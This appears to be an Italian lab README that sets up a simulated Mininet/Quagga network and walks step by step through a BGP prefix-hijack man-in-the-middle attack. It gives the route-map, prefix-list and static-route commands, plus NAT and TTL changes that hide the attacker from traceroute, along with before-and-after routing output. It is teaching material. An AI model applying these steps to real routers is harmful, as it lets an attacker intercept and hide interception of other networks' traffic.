# bgp-man-in-the-middle

## Installazione VM

Scaricare la VM Mininet [http://www.scs.stanford.edu/~jvimal/mininet-sigcomm14/mininet-tutorial-vm-64bit.zip](http://www.scs.stanford.edu/~jvimal/mininet-sigcomm14/mininet-tutorial-vm-64bit.zip).  
Per accedere:

- username: mininet
- password: mininet

## Preparazione mininet

- `$ git clone https://github.com/mininet/mininet`

- `$ cd mininet`

- `$ git checkout 2.3.0d4`

- `$ ./util/install.sh -a`

- `$ mn --test pingall`

- `$ mn --version`

## Quagga preparation

Scaricare quagga-1.2.4 from [http://download.savannah.gnu.org/releases/quagga/](http://download.savannah.gnu.org/releases/quagga/) nella tua `$HOME` ed estrai il package

- `$ cd ~/quagga-1.2.4`

- `# chown mininet:mininet /var/run/quagga`

- modifica il file `configure`, aggiungendo `${quagga_statedir_prefix}/var/run/quagga` prima di tutte le opzioni del loop su `QUAGGA_STATE_DIR` 

- `$ ./configure --enable-user=mininet --enable-group=mininet`

- `$ make`

---

## Descrizione dell'attacco

La topologia presenta sei AS (AS100, AS200, AS10, AS20, AS30, AS40) ognuno gestito da un'istanza del daemon bgp (rispettivamente R100, R200, R10, R20, R30, R40).

![topologia](./images/bgp-mitm-topology.png)

L'attaccante R100 vuole fare da man-in-the-middle tra la rete 10.200.0.0/22 ospitata dall'AS200 e gli host appartenenti agli AS AS40 e AS30.

Quando la rete è stabile, il traffico instradato verso la rete 10.200.0.0/22 segue i path descritti dalla figura che segue.

![topologia](./images/bgp-mitm-pre-attack.png)

Quindi ciascun AS sceglie i seguenti AS_PATH per raggiungerla.

|AS|AS_PATH|
|-|-|
|AS10	|AS20, AS200|
|AS20	|AS200|
|AS30	|AS200|
|AS40	|AS30, AS200|
|AS100	|AS10, AS20, AS200|

L'attaccante R100 annuncia la rete 10.200.0.0 con una sotto rete più specifica. Quindi invece che una /22 annuncia una /24. Questo è possibile sfruttando una route-map.

<!-- https://www.examcollection.com/certification-training/ccnp-concept-of-route-maps.html -->

> Una route-map personalizza la gestione del traffico, al di là di quanto dettato dalla routing table. Le route-map sono principalmente usate per distribuire le rotte nei processi di routing RIP, EIGRP, OSPF o BGP. Vengono anche usate per la generazione della rotta di default nel processo di routing OSPF. Definiscono anche quali rotte da uno specifico protocollo di routing possono essere redistribuite in uno specifico processo di routing.
> Le route-map hanno alcune caratteristiche in comune con le ACL. Entrambe sono un meccanismo generico. Sono una sequenza ordinata di singole istruzioni, ognuna delle quali può risultare in un deny o in un permit.
> Per quanto riguarda le differenze, le route-map sono più flessibili delle ACL e possono eseguire dei controlli sulle rotte in base a criteri non disponibili per le ACL. Il risultato dell'applicazione di un'ACL è sì o no, quindi consente o meno la redistribuzione della rotta. Mentre la route-map non solo permette o nega la redistribuzione ma è in grado di modificare le informazioni associate alla rotta.

Gli AS vittima sceglieranno la rotta più specifica per inoltrare il traffico verso la rete obiettivo, quindi la /24.
L'attaccante R100 deve installare una rotta statica per la rete 10.200.0.0/24 verso il vicino R10.
Inoltre deve fare NATting dell'indirizzo IP sorgente del traffico proveniente dai prefissi annunciati da AS30 e AS40, convertendolo nell'indirizzo IP della sua interfaccia con cui è connesso a R10.

Per nascondersi da un eventuale `traceroute` lanciato dagli host vittima, l'attaccante incrementa i valori di TTL dei pacchetti che inoltra.

A seguito dell'attacco gli AS_PATH scelti da ciascun AS per raggiungere la rete 10.200.0.0/24 risultano i seguenti.

![topologia](./images/bgp-mitm-post-attack.png)

|AS|AS_PATH|
|-|-|
|AS10	|AS20, AS200|
|AS20	|AS200|
|AS30	|AS40, AS100|
|AS40	|AS100|
|AS100	|AS10, AS20, AS200|

Gli AS30 e AS40 suppongono che la rete 10.200.0.0/24 sia ospitata dall'AS100. Quindi il traffico in partenza da AS30 e AS40 destinato alla rete 10.200.0.0/24 viene inoltrato verso l'AS100, che lo gestirà usando la rotta statica e la regola di NAT inoltrandolo verso l'AS10.

Gli host vittime non notano nessun cambiamento nella lunghezza del path per raggiungere la rete obiettivo in AS200, ma solo un incremento di latenza.

## Esecuzione dell'attacco

**. Avviamo l'ambiente di simulazione.**

Avviamo le istanze dei router, degli AS e degli host eseguendo il comando.

`# python bgp.py`

**. Accediamo al daemon bgp.**

In un altro terminale avviamo una sessione con il daemon bgp dell'AS100. La password per accedere è `en`. 

`$ ./connect-bgp.sh`

Per accedere alla shell di amministratore lanciamo il comando `en`; la password di accesso è `en`.

```
bgpd-R100> en
Password: 
bgpd-R100# 
```

**. Controlliamo la routing table.**

Verifichiamo le entry di routing di R100 quando la rete è stabile. Lanciamo il comando:

`bgpd-R100# show ip bgp`

Output:

	BGP table version is 0, local router ID is 100.100.100.100
	Status codes: s suppressed, d damped, h history, * valid, > best, = multipath,
		          i internal, r RIB-failure, S Stale, R Removed
	Origin codes: i - IGP, e - EGP, ? - incomplete

	   Network          Next Hop            Metric LocPrf Weight Path
	*> 9.0.30.0/30      9.0.110.1                0             0 10 i
	*> 9.0.70.0/30      9.0.140.1                0             0 40 i
	*  9.0.110.0/30     9.0.110.1                0             0 10 i
	*>                  0.0.0.0                  0         32768 i
	*  9.0.140.0/30     9.0.140.1                0             0 40 i
	*>                  0.0.0.0                  0         32768 i
	*> 9.0.220.0/30     9.0.110.1                              0 10 20 i
	*                   9.0.140.1                              0 40 30 200 i
	*  9.0.230.0/30     9.0.110.1                              0 10 20 200 i
	*>                  9.0.140.1                              0 40 30 i
	*> 10.10.0.0/22     9.0.110.1                0             0 10 i
	*  10.20.0.0/22     9.0.140.1                              0 40 30 200 20 i
	*>                  9.0.110.1                              0 10 20 i
	*  10.30.0.0/22     9.0.110.1                              0 10 20 200 30 i
	*>                  9.0.140.1                              0 40 30 i
	*> 10.40.0.0/22     9.0.140.1                0             0 40 i
	*> 10.100.0.0/22    0.0.0.0                  0         32768 i
	*> 10.200.0.0/22    9.0.110.1                            100 10 20 200 i
	*                   9.0.140.1                              0 40 30 200 i

	Displayed  12 out of 19 total prefixes

Dall'output capiamo che l'AS100 sceglie il path "10 20 200" per raggiungere la rete 10.200.0.0/22.

**. Accediamo al daemon zebra.**

In un altro terminale avviamo una sessione con il daemon zebra del R100. La password per accedere come utente è `en`. 

`$ ./connect-zebra.sh`

Per accedere alla shell di amministratore lanciamo il comando `en`; la password di accesso è `en`.

```
R100> en
Password: 
R100# 
```

**. Controlliamo le rotte.**

Verifichiamo le rotte scelte da R100. Lanciamo il comando:

`R100# show ip route`

Output:

	Codes: K - kernel route, C - connected, S - static, R - RIP,
		   O - OSPF, I - IS-IS, B - BGP, P - PIM, A - Babel, N - NHRP,
		   > - selected route, * - FIB route

	B>* 9.0.30.0/30 [20/0] via 9.0.110.1, R100-eth2, 00:01:07
	B>* 9.0.70.0/30 [20/0] via 9.0.140.1, R100-eth3, 00:01:08
	C>* 9.0.110.0/30 is directly connected, R100-eth2
	C>* 9.0.140.0/30 is directly connected, R100-eth3
	B>* 9.0.220.0/30 [20/0] via 9.0.110.1, R100-eth2, 00:01:04
	B>* 9.0.230.0/30 [20/0] via 9.0.140.1, R100-eth3, 00:01:05
	B>* 10.10.0.0/22 [20/0] via 9.0.110.1, R100-eth2, 00:01:07
	B>* 10.20.0.0/22 [20/0] via 9.0.110.1, R100-eth2, 00:01:04
	B>* 10.30.0.0/22 [20/0] via 9.0.140.1, R100-eth3, 00:01:05
	B>* 10.40.0.0/22 [20/0] via 9.0.140.1, R100-eth3, 00:01:08
	C>* 10.100.0.0/24 is directly connected, R100-eth1
	B>* 10.200.0.0/22 [20/0] via 9.0.110.1, R100-eth2, 00:01:01
	C>* 127.0.0.0/8 is directly connected, lo
	C>* 127.0.0.1/32 is directly connected, lo

Vediamo che R100 usa una rotta appresa tramite BGP passando attraverso l'AS10 (il router dirimpettaio R10 ha indirizzo IP 9.0.110.1) per raggiungere la rete 10.200.0.0/22.

**. Verifichiamo l'instradamento tramite traceroute.**

In un altro terminale lanciamo il seguente script:

`$ ./test-traceroute.sh`

Questo esegue `traceroute` dagli host presenti in ogni AS verso gli host presenti nell'AS AS200.
Gli output interessanti sono i seguenti.

	########## 10.40.0.1 traceroute 10.200.0.1 ##########
	traceroute to 10.200.0.1 (10.200.0.1), 10 hops max, 60 byte packets
	 1  10.40.0.254  0.073 ms  0.019 ms  0.017 ms
	 2  9.0.70.1  0.038 ms  0.028 ms  0.028 ms
	 3  9.0.230.2  0.046 ms  0.037 ms  0.036 ms
	 4  10.200.0.1  0.054 ms  0.047 ms  0.045 ms

	########## 10.30.0.1 traceroute 10.200.0.1 ##########
	traceroute to 10.200.0.1 (10.200.0.1), 10 hops max, 60 byte packets
	 1  10.30.0.254  0.077 ms  0.020 ms  0.018 ms
	 2  9.0.230.2  0.040 ms  0.031 ms  0.030 ms
	 3  10.200.0.1  0.049 ms  0.043 ms  0.036 ms

**. Lanciamo l'attacco.**

Imponiamo la route-map. Nella shell bgp di R100 lanciamo i seguenti comandi:

	bgpd-R100# configure terminal
	
	bgpd-R100(config)# router bgp 100
	bgpd-R100(config)#   network 10.200.0.0/24
	##################   la rete viene annunciata ai vicini
	bgpd-R100(config)#   neighbor 9.0.110.1 route-map evil-route-map out
	##################   la route-map viene applicata in output verso l'AS10
	bgpd-R100(config)#   exit
	bgpd-R100(config)# ip prefix-list evil-prefix-list permit 10.200.0.0/24
	################## definizione di prefissi da attaccare
	bgpd-R100(config)# route-map evil-route-map permit 10
	################## definizione della route-map
	bgpd-R100(config)#   match ip address prefix-list evil-prefix-list
	##################   restringe la route-map ai soli prefissi da attaccare
	bgpd-R100(config)#   set as-path prepend 10 20 200
	##################   azione da applicare

Impostiamo la rotta statica. Nella shell zebra di R100 lanciamo i seguenti comandi:

	R100# configure terminal
	R100(config)# ip route 10.200.0.0/24 9.0.110.1

**. Controlliamo le scelte di routing degli AS**

Accediamo al daemon bgp di R40 (`./connect-bgp.sh R40`) e la sua routing table (`bgpd-R40# show ip bgp`) risulta:

	BGP table version is 0, local router ID is 40.40.40.40
	Status codes: s suppressed, d damped, h history, * valid, > best, = multipath,
		          i internal, r RIB-failure, S Stale, R Removed
	Origin codes: i - IGP, e - EGP, ? - incomplete

	   Network          Next Hop            Metric LocPrf Weight Path
	*  9.0.30.0/30      9.0.70.1                               0 30 200 20 i
	*>                  9.0.140.2                              0 100 10 i
	*  9.0.70.0/30      9.0.70.1                 0             0 30 i
	*>                  0.0.0.0                  0         32768 i
	*> 9.0.110.0/30     9.0.140.2                0             0 100 i
	*  9.0.140.0/30     9.0.140.2                0             0 100 i
	*>                  0.0.0.0                  0         32768 i
	*  9.0.220.0/30     9.0.140.2                              0 100 10 20 i
	*>                  9.0.70.1                               0 30 200 i
	*> 9.0.230.0/30     9.0.70.1                 0             0 30 i
	*> 10.10.0.0/22     9.0.140.2                              0 100 10 i
	*  10.20.0.0/22     9.0.140.2                              0 100 10 20 i
	*>                  9.0.70.1                               0 30 200 20 i
	*> 10.30.0.0/22     9.0.70.1                 0             0 30 i
	*> 10.40.0.0/22     0.0.0.0                  0         32768 i
	*> 10.100.0.0/22    9.0.140.2                0             0 100 i
	*  10.200.0.0/22    9.0.140.2                              0 100 10 20 200 i
	*>                  9.0.70.1                               0 30 200 i
	*> 10.200.0.0/24    9.0.140.2                0             0 100 i

	Displayed  13 out of 19 total prefixes
	
Vediamo che R40 inoltrerà il traffico verso la rete 10.200.0.0/24 ad AS100 invece che attraverso AS30.

Analogamente per il daemon bgp di R30 risulta

	BGP table version is 0, local router ID is 30.30.30.30
	Status codes: s suppressed, d damped, h history, * valid, > best, = multipath,
		          i internal, r RIB-failure, S Stale, R Removed
	Origin codes: i - IGP, e - EGP, ? - incomplete

	   Network          Next Hop            Metric LocPrf Weight Path
	*  9.0.30.0/30      9.0.70.2                               0 40 100 10 i
	*>                  9.0.230.2                              0 200 20 i
	*  9.0.70.0/30      9.0.70.2                 0             0 40 i
	*>                  0.0.0.0                  0         32768 i
	*  9.0.110.0/30     9.0.230.2                              0 200 20 10 i
	*>                  9.0.70.2                               0 40 100 i
	*> 9.0.140.0/30     9.0.70.2                 0             0 40 i
	*> 9.0.220.0/30     9.0.230.2                0             0 200 i
	*  9.0.230.0/30     9.0.230.2                0             0 200 i
	*>                  0.0.0.0                  0         32768 i
	*  10.10.0.0/22     9.0.230.2                              0 200 20 10 i
	*>                  9.0.70.2                               0 40 100 10 i
	*> 10.20.0.0/22     9.0.230.2                              0 200 20 i
	*> 10.30.0.0/22     0.0.0.0                  0         32768 i
	*> 10.40.0.0/22     9.0.70.2                 0             0 40 i
	*  10.100.0.0/22    9.0.230.2                              0 200 20 10 100 i
	*>                  9.0.70.2                               0 40 100 i
	*> 10.200.0.0/22    9.0.230.2                0             0 200 i
	*> 10.200.0.0/24    9.0.70.2                               0 40 100 i

Displayed  13 out of 19 total prefixes

Vediamo che R30 inoltrerà il traffico verso la rete 10.200.0.0/24 ad AS40 invece che direttamente ad AS200.

**. Imponiamo il NATting**

Imponiamo le sole regole di NATting lanciando lo script:

`$ ./R100-nat.sh`

**. Verifichiamo l'instradamento tramite traceroute.**

In un altro terminale lanciamo il seguente script:

`$ ./test-traceroute.sh`

Gli output interessanti sono i seguenti, confrontabili con il precedente output dello stesso script.

	########## 10.40.0.1 traceroute 10.200.0.1 ##########
	traceroute to 10.200.0.1 (10.200.0.1), 10 hops max, 60 byte packets
	 1  10.40.0.254  0.057 ms  0.019 ms  0.018 ms
	 2  9.0.140.2  0.058 ms  0.035 ms  0.029 ms
	 3  9.0.110.1  0.052 ms  0.040 ms  0.039 ms
	 4  9.0.30.2  0.057 ms  0.049 ms  0.047 ms
	 5  * * *
	 6  10.200.0.1  0.076 ms  0.071 ms  0.081 ms

	########## 10.30.0.1 traceroute 10.200.0.1 ##########
	traceroute to 10.200.0.1 (10.200.0.1), 10 hops max, 60 byte packets
	 1  10.30.0.254  0.055 ms  0.019 ms  0.017 ms
	 2  9.0.70.2  0.037 ms  0.028 ms  0.028 ms
	 3  9.0.140.2  0.047 ms  0.039 ms  0.037 ms
	 4  9.0.110.1  0.059 ms  0.047 ms  0.048 ms
	 5  * * *
	 6  * * *
	 7  10.200.0.1  0.084 ms  0.077 ms  0.076 ms

Gli host si accorgono che per raggiungere la rete 10.200.0.0 devono attraversare un percorso pi\`u lungo del solito.

N.B.: Gli asterschi sono dovuti ad una mancata risposta per i particolari TTL (per il primo output 5, per il secondo 5,6).

**. Imponiamo il NATting e il mascheramento dell'attaccante**

Imponiamo le regole di NATting e l'incremento del TTL per nascondere l'attaccante lanciando lo script:

`$ ./R100-nat-n-mangle.sh`s

**. Riverifichiamo l'instradamento tramite traceroute.**

In un altro terminale rilanciamo lo script:

`$ ./test-traceroute.sh`

Gli output interessanti sono i seguenti, confrontabili con il precedente output dello stesso script.

	########## 10.40.0.1 traceroute 10.200.0.1 ##########
	traceroute to 10.200.0.1 (10.200.0.1), 10 hops max, 60 byte packets
	 1  10.40.0.254  0.057 ms  0.021 ms  0.017 ms
	 2  9.0.30.2  0.076 ms  0.065 ms  0.064 ms
	 3  * * *
	 4  10.200.0.1  0.142 ms  0.086 ms  0.068 ms

	########## 10.30.0.1 traceroute 10.200.0.1 ##########
	traceroute to 10.200.0.1 (10.200.0.1), 10 hops max, 60 byte packets
	 1  10.30.0.254  0.066 ms  0.020 ms  0.018 ms
	 2  9.0.70.2  0.038 ms  0.029 ms  0.029 ms
	 3  10.200.0.1  0.115 ms  0.099 ms  0.154 ms

Vediamo che i client raggiungono la rete ospitata dall'AS200 con lo stesso numero di hop di una situazione stabile, ma con un leggero aumento di latenza.

**. Fermiamo l'ambiente di simulazione.**

Fermiamo le istanze dal terminale di mininet:

`mininet> exit`

<!--
# UPDATE scambiati tra i router

Prima dell'attacco AS10 annuncia ad AS100 la raggiungibilità della rete 10.200.0.0/22 attraverso gli AS AS10, AS20, AS200

![R100-pre-attack-R10-UPDATE](./images/0-R100-pre-attack-R10-UPDATE.png)

Dopo l'attacco AS100 annuncia ad AS10 la raggiungibilità della rete 10.200.0.0/24 anteponendo se stesso agli AS AS10, AS20, AS200

![R100-post-attack-R100-UPDATE](./images/1-R100-post-attack-R100-UPDATE.png)

Dopo l'attacco AS10 annuncia ad AS100 la raggiungibilità della rete 10.200.0.0/24 attraverso gli AS AS10, AS20, AS200, AS30, AS40, AS100

![R100-post-attack-R10-UPDATE](./images/2-R100-post-attack-R10-UPDATE.png)

Prima dell'attacco AS100 annuncia ad AS40 la raggiungibilità della rete 10.200.0.0/22 attraverso gli AS AS100, AS10, AS20, AS200

![R100-pre-attack-R100-UPDATE](./images/3-R100-pre-attack-R100-UPDATE.png)

Prima dell'attacco AS40 annuncia ad AS100 la raggiungibilità della rete 10.200.0.0/22 attraverso gli AS AS40, AS30, AS200

![R100-pre-attack-R40-UPDATE](./images/4-R100-pre-attack-R40-UPDATE.png)

Dopo l'attacco AS100 annuncia ad AS40 la raggiungibilità della rete 10.200.0.0/24 attraverso se stesso

![R100-post-attack-R100-UPDATE](./images/5-R100-post-attack-R100-UPDATE.png)

Prima dell'attacco AS30 annuncia ad AS40 la raggiungibilità della rete 10.200.0.0/22 attraverso gli AS AS30, AS200

![R40-pre-attack-R30-UPDATE](./images/6-R40-pre-attack-R30-UPDATE.png)

Dopo l'attacco AS40 annuncia ad AS30 la raggiungibilità della rete 10.200.0.0/24 attraverso gli AS AS40, AS100

![R40-post-attack-R40-UPDATE](./images/7-R40-post-attack-R40-UPDATE.png)

Prima dell'attacco AS200 annuncia ad AS30 la raggiungibilità della rete 10.200.0.0/22 attraverso se stesso

![R30-pre-attack-R200-UPDATE](./images/8-R30-pre-attack-R200-UPDATE.png)

Dopo l'attacco AS30 annuncia ad AS200 la raggiungibilità della rete 10.200.0.0/24 attraverso gli AS AS30, AS40, AS100

![R30-pre-attack-R30-UPDATE](./images/9-R30-pre-attack-R30-UPDATE.png)

# Routing Table dei router

Routing table di R100 prima dell'attacco

![R100-pre-attack](./images/RT0-R100-pre-attack.png)

Routing table di R100 dopo l'attacco

![R100-post-attack](./images/RT1-R100-post-attack.png)

Routing table di R40 prima dell'attacco

![R40-pre-attack](./images/RT2-R40-pre-attack.png)

Routing table di R40 dopo l'attacco

![R40-post-attack](./images/RT3-R40-post-attack.png)

Routing table di R30 prima dell'attacco

![R30-pre-attack](./images/RT4-R30-pre-attack.png)

Routing table di R30 dopo l'attacco

![R30-post-attack](./images/RT5-R30-post-attack.png)

# Ping di raggiungibilità

R30 inoltra il traffico per 10.200.0.0/24 verso l'AS40

![30pings200](./images/ping0-30pings200.png)

R40 inoltra il traffico per 10.200.0.0/24 verso l'AS100

![40pings200](./images/ping1-40pings200.png)

![30pings200](./images/ping2-30pings200.png)

R100 inoltra il traffico per 10.200.0.0/24 verso l'AS10

![40pings200](./images/ping3-40pings200.png)

![30pings200](./images/ping4-30pings200.png)

![100pings200](./images/ping5-100pings200.png)

R10 inoltra il traffico per 10.200.0.0/24 verso l'AS20

![100pings200](./images/ping6-100pings200.png)

![40pings200](./images/ping7-40pings200.png)

R20 inoltra il traffico per 10.200.0.0/24 verso l'AS200

![100pings200](./images/ping8-100pings200.png)

![40pings200](./images/ping9-40pings200.png)
-->
